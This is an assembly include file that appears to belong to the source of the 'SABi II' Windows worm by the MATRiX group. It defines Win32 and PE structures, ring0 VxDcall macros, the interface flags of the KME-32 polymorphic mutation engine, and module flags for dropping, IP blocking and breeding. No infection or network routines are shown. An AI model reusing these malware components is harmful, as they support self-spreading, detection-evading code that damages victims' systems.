   ; Trojan/I-Worm/Palm/Wm/W32.SABi¡ II
   ; 
   ; by: NBK & Ultras / MATRiX

   TIMES_INFECT EQU TRUE   ;   FALSE

   SII     EQU 33792   ;   wrong size = crash !
   SII_VER EQU 00001000

   FALSE   =       0
   TRUE    =       1
   NULL    =       0
   ERROR_SUCCESS = 0
   INVALID_HANDLE_VALUE = -1
   MAX_PATH =      260

   JUMP MACRO a
      push SII
      ret
   ENDM

   dia  EQU ((60*60)*1000) * 24

   CREATE_NEW                           equ 1
   CREATE_ALWAYS                        equ 2
   OPEN_EXISTING                        equ 3
   OPEN_ALWAYS                          equ 4
   TRUNCATE_EXISTING                    equ 5

   GENERIC_READ                         equ 80000000h
   GENERIC_WRITE                        equ 40000000h
   GENERIC_EXECUTE                      equ 20000000h
   GENERIC_ALL                          equ 10000000h

   WIN32_FIND_DATA struc
     dwFileAttributes    dd   ?
     ftCreationTime      dd   ?,?
     ftLastAccessTime    dd   ?,?
     ftLastWriteTime     dd   ?,?
     nFileSizeHigh       dd   ?
     nFileSizeLow        dd   ?
     dwReserved0         dd   ?
     dwReserved1         dd   ?
     cFileName           db   MAX_PATH dup(?)
     cAlternateFileName  db   14 dup(?)
   WIN32_FIND_DATA ends

   STARTUPINFO STRUCT
     cb                DWORD      ?
     lpReserved        DWORD      ?
     lpDesktop         DWORD      ?
     lpTitle           DWORD      ?
     dwX               DWORD      ?
     dwY               DWORD      ?
     dwXSize           DWORD      ?
     dwYSize           DWORD      ?
     dwXCountChars     DWORD      ?
     dwYCountChars     DWORD      ?
     dwFillAttribute   DWORD      ?
     dwFlags           DWORD      ?
     wShowWindow       WORD       ?
     cbReserved2       WORD       ?
     lpReserved2       DWORD      ?
     hStdInput         DWORD      ?
     hStdOutput        DWORD      ?
     hStdError         DWORD      ?
   STARTUPINFO ENDS

   PROCESS_INFORMATION STRUCT
     hProcess      DWORD      ?
     hThread       DWORD      ?
     dwProcessId   DWORD      ?
     dwThreadId    DWORD      ?
   PROCESS_INFORMATION ENDS

   FILE_ATTRIBUTE_READONLY              equ 1h
   FILE_ATTRIBUTE_HIDDEN                equ 2h
   FILE_ATTRIBUTE_SYSTEM                equ 4h
   FILE_ATTRIBUTE_DIRECTORY             equ 10h
   FILE_ATTRIBUTE_ARCHIVE               equ 20h
   FILE_ATTRIBUTE_NORMAL                equ 80h
   FILE_ATTRIBUTE_TEMPORARY             equ 100h
   FILE_ATTRIBUTE_COMPRESSED            equ 800h

   SYSTEMTIME STRUCT
     wYear             WORD      ?
     wMonth            WORD      ?
     wDayOfWeek        WORD      ?
     wDay              WORD      ?
     wHour             WORD      ?
     wMinute           WORD      ?
     wSecond           WORD      ?
     wMilliseconds     WORD      ?
   SYSTEMTIME ENDS

   DRIVE_REMOVABLE                      equ 2
   DRIVE_FIXED                          equ 3
   DRIVE_REMOTE                         equ 4
   DRIVE_CDROM                          equ 5
   DRIVE_RAMDISK                        equ 6

   FILETIME STRUCT
     dwLowDateTime     DWORD      ?
     dwHighDateTime    DWORD      ?
   FILETIME ENDS

   ERROR_ALREADY_EXISTS                 equ 183

   OSVERSIONINFOA STRUCT
     dwOSVersionInfoSize   DWORD      ?
     dwMajorVersion        DWORD      ?
     dwMinorVersion        DWORD      ?
     dwBuildNumber         DWORD      ?
     dwPlatformId          DWORD      ?
     szCSDVersion          BYTE 128 dup (?)
   OSVERSIONINFOA ENDS

   OSVERSIONINFO  equ  <OSVERSIONINFOA>

   HKEY_CURRENT_USER  EQU 80000001h
   HKEY_LOCAL_MACHINE EQU 80000002h

   WSADESCRIPTION_LEN          equ 256
   WSASYS_STATUS_LEN           equ 128

   WSADATA STRUCT
     wVersion      WORD      ?
     wHighVersion  WORD      ?
     szDescription BYTE WSADESCRIPTION_LEN + 1 dup (?)
     szSystemStatus  BYTE WSASYS_STATUS_LEN + 1 dup (?)
     iMaxSockets   WORD      ?
     iMaxUdpDg     WORD      ?
     lpVendorInfo  DWORD     ?
   WSADATA ENDS


; ring0.inc


VMM                     equ     0001h
VXDLDR                  equ     0027h
GetDeviceList           equ     0005h
Get_DDB                 equ     0146h
PageQuery               equ     0134h



VxDcall                 macro   VxD, Service
                        db      0CDh
                        db      020h
                        dw      Service
                        dw      VxD
                        endm

VMMcall                 macro   Service
                        VxDcall VMM, Service
                        endm



pusho                   macro   lbl
                        local   __tmp
                        call    __tmp
                        jmp     lbl
__tmp:                  endm

   show macro x

   pushad
   push x
   mov eax, esp
   push 0 eax eax 0
   mov eax, MESS
   call eax
   pop eax
   popad

   endm


;kme3.INT


; ===========================================================================
; KME-32  v3.00   Kewl Mutation Engine   (c) 99-00  Z0MBiE, Vecna
; ===========================================================================

; --------------------- flags -----------------------------------------------

FLAG_DEBUG              equ     00000001h ; insert INT3 into poly decr
FLAG_NOLOGIC            equ     00000002h ; disable "logic"
FLAG_NOJMPS             equ     00000004h ; disable JMPs.
  ; NOJMPS means generate continuous block of code
FLAG_EIP0               equ     00000008h ; initial entry = 0, not rnd
FLAG_NOSHORT            equ     00000010h ; disable short-opcodes for EAX
; v3.00+
FLAG_NOSHORT_C          equ     00000020h ; disable short-consts usage
FLAG_NOSWAP             equ     00000040h ; disable [cmd r1,r2] perverting

; --------------------- registers -------------------------------------------

REG_EAX                 equ     00000001h ; bitfields for register mask
REG_ECX                 equ     00000002h ;
REG_EDX                 equ     00000004h ; at least 1 register should
REG_EBX                 equ     00000008h ; be specified.
REG_ESP                 equ     00000010h ; use REG_DEFAULT otherwise
REG_EBP                 equ     00000020h ;
REG_ESI                 equ     00000040h ;
REG_EDI                 equ     00000080h ;
REG_ALL                 equ     (not REG_ESP) and 255

REG_DEFAULT             equ     REG_EAX

REG_EAX_N               equ     0
REG_ECX_N               equ     1
REG_EDX_N               equ     2
REG_EBX_N               equ     3
REG_ESP_N               equ     4
REG_EBP_N               equ     5
REG_ESI_N               equ     6
REG_EDI_N               equ     7

; --------------------- commands --------------------------------------------

CMD_ALL                 equ     -1              ; use all available commands

CMD_MOV                 equ     00000001h       ; bitfields for command mask
CMD_XCHG                equ     00000002h       ;
CMD_ADD                 equ     00000004h       ; at least 1 command should
CMD_SUB                 equ     00000008h       ; be specified. default=XOR
CMD_XOR                 equ     00000010h       ;
CMD_INC                 equ     00000020h       ; all CMD_xxx commands can be
CMD_DEC                 equ     00000040h       ; disabled by FLAG_NOLOGIC
CMD_OR                  equ     00000080h       ;
CMD_AND                 equ     00000100h       ;
CMD_SHL                 equ     00000200h       ;
CMD_SHR                 equ     00000400h       ;
CMD_ROL                 equ     00000800h       ;
CMD_ROR                 equ     00001000h       ;
CMD_SAR                 equ     00002000h       ;
CMD_NOT                 equ     00004000h       ;
CMD_NEG                 equ     00008000h       ;
CMD_IMUL_EX             equ     00010000h       ;
CMD_SHLD                equ     00020000h       ;
CMD_SHRD                equ     00040000h       ;
CMD_BTC                 equ     00080000h       ;
CMD_BTR                 equ     00100000h       ;
CMD_BTS                 equ     00200000h       ;
CMD_BSWAP               equ     00400000h       ;
CMD_XADD                equ     00800000h       ;
CMD_MOVSXZX             equ     01000000h       ; mov?x
CMD_BSR                 equ     02000000h       ;
CMD_BSF                 equ     04000000h       ;
CMD_MUL                 equ     08000000h
CMD_IMUL                equ     10000000h
CMD_DIV                 equ     20000000h
CMD_IDIV                equ     40000000h
CMD_PUSHPOP             equ     80000000h       ; used when initializing regs
;;
CMD_OLDSTUFF            equ     000FFFFFFh      ; 1.00
CMD_NEWSTUFF            equ     0FF000000h      ; 2.00+

CMD2_ALL                equ     -1

CMD2_PUSHPOPR           equ     00000001h       ; push r; polycmd; pop r
CMD2_PUSHPOPC           equ     00000002h       ; push c; polycmd; pop r
CMD2_IFOLLOW            equ     00000004h       ; cmp r, c; jxx
CMD2_INOFOLLOW          equ     00000008h       ; cmp r, c; jxx fake
CMD2_RFOLLOW            equ     00000010h       ; cmp r, r; jxx
CMD2_RNOFOLLOW          equ     00000020h       ; cmp r, r; jxx fake
CMD2_JXX                equ     00000014h
CMD2_JXX_FAKE           equ     00000028h
CMD2_SUBROUTINE         equ     00000040h       ; 8-()
CMD2_CYCLE              equ     00000080h       ; |->
CMD2_FPU                equ     00000100h       ; X-)

; ===========================================================================

THREAD_PRIORITY_LOWEST  equ -2

IMAGE_SECTION_HEADER STRUC                         ; 
    SH_Name                 DB 8 DUP(?)            ; 
    SH_VirtualSize          DD ?                   ; 
    SH_VirtualAddress       DD ?                   ; 
    SH_SizeOfRawData        DD ?                   ; 
    SH_PointerToRawData     DD ?                   ; 
    SH_PointerToRelocations DD ?                   ; 
    SH_PointerToLinenumbers DD ?                   ; 
    SH_NumberOfRelocations  DW ?                   ; 
    SH_NumberOfLinenumbers  DW ?                   ; 
    SH_Characteristics      DD ?                   ; 
IMAGE_SECTION_HEADER ENDS                          ;

IMAGE_FILE_HEADER STRUC           ; 
    PE_Magic                 DD ? ;
    Machine                  DW ? ; 
    NumberOfSections         DW ? ; 
    TimeDateStamp            DD ? ; 
    PointerToSymbolTable     DD ? ; 
    NumberOfSymbols          DD ? ; 
    SizeOfOptionalHeader     DW ? ; 
    Characteristics          DW ? ; 
IMAGE_FILE_HEADER ENDS            ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY STRUC                         ; Image data directory
    DD_VirtualAddress DD ?                         ; Virtual address
    DD_Size           DD ?                         ; Virtual size
IMAGE_DATA_DIRECTORY ENDS                          ;

IMAGE_DIRECTORY_ENTRIES STRUC                      ; All directories
    DE_Export           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Import           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Resource         IMAGE_DATA_DIRECTORY    ?  ;
    DE_Exception        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Security         IMAGE_DATA_DIRECTORY    ?  ;
    DE_BaseReloc        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Debug            IMAGE_DATA_DIRECTORY    ?  ;
    DE_Copyright        IMAGE_DATA_DIRECTORY    ?  ;
    DE_GlobalPtr        IMAGE_DATA_DIRECTORY    ?  ;
    DE_TLS              IMAGE_DATA_DIRECTORY    ?  ;
    DE_LoadConfig       IMAGE_DATA_DIRECTORY    ?  ;
    DE_BoundImport      IMAGE_DATA_DIRECTORY    ?  ;
    DE_IAT              IMAGE_DATA_DIRECTORY    ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS                       ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16              ;

IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
    OH_Magic                        DW ?           ; Palavra-chave         ***
    OH_MajorLinkerVersion           DB ?           ; Major Linker version
    OH_MinorLinkerVersion           DB ?           ; Minor Linker version
    OH_SizeOfCode                   DD ?           ; Size of code section
    OH_SizeOfInitializedData        DD ?           ; Initialized Data
    OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
    OH_AddressOfEntryPoint          DD BYTE PTR ?  ; 
    OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
    OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
    OH_ImageBase                    DD BYTE PTR ?  ; 
    OH_SectionAlignment             DD ?           ; Usado no alinhamento da seÁ„o
    OH_FileAlignment                DD ?           ; Usado no alinhamento do arquivo
    OH_MajorOperatingSystemVersion  DW ?           ; Major OS
    OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
    OH_MajorImageVersion            DW ?           ; Major Image version
    OH_MinorImageVersion            DW ?           ; Minor Image version
    OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
    OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
    OH_Win32VersionValue            DD ?           ; win32 version
    OH_SizeOfImage                  DD ?           ; Tamanho da memoria     ***
    OH_SizeOfHeaders                DD ?           ; Size of Header
    OH_CheckSum                     DD ?           ; unused
    OH_Subsystem                    DW ?           ; Subsystem
    OH_DllCharacteristics           DW ?           ; 
    OH_SizeOfStackReserve           DD ?           ; Stack reserve
    OH_SizeOfStackCommit            DD ?           ; Stack commit
    OH_SizeOfHeapReserve            DD ?           ; Heap reserve
    OH_SizeOfHeapCommit             DD ?           ; Heap commit
    OH_LoaderFlags                  DD ?           ; Loader flags
    OH_NumberOfRvaAndSizes          DD ?           ; Numero de diretorios   ***
                                    UNION          ; directory entries
    OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
    OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                    ENDS           ;
    ENDS                                           ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER

idata_rva equ 0AF000h
SizeOfImage equ 0B2000h
SectionAlignment equ 1000h
FileAlignment equ 200h
AddressOfEntryPoint equ 0B0000h
S2_NumberOfSections equ 4

MT_PROCESSDROPPER EQU 00000001b
MT_BLOCKIP        EQU 00000010b
MT_APP            EQU 00000100b
MT_GENTEXT        EQU 00001000b
MT_QUERY          EQU 00010000b
MT_BREED          EQU 00100000b
MT_BLOOM          EQU 01000000b

MS_SENT           EQU 010000000000000000000000000000000b

MR_OK      EQU 00000001b
MR_SEH     EQU 00000010b
MR_SKIPSEH EQU 00000100b
MR_ERROR   EQU 00001000b
MR_DONE    EQU 00010000b
MR_DELETE  EQU 01000000b
MR_INVALID EQU 10000000b

m_why         EQU 0
m_result      EQU 0

m_dropper     EQU 4
m_buffer      EQU 4
m_ip          EQU 4
m_kind        EQU 4
m_muazzin     EQU 4

m_version     EQU 8
m_droppersize EQU 8
m_port        EQU 8
m_iroutine    EQU 8

GMH           EQU 12

GPA           EQU 16

size_muazzin_struc EQU 20

menum_kind        EQU 0
menum_type        EQU 4
menum_version     EQU 8

menum_sizeof      EQU 12
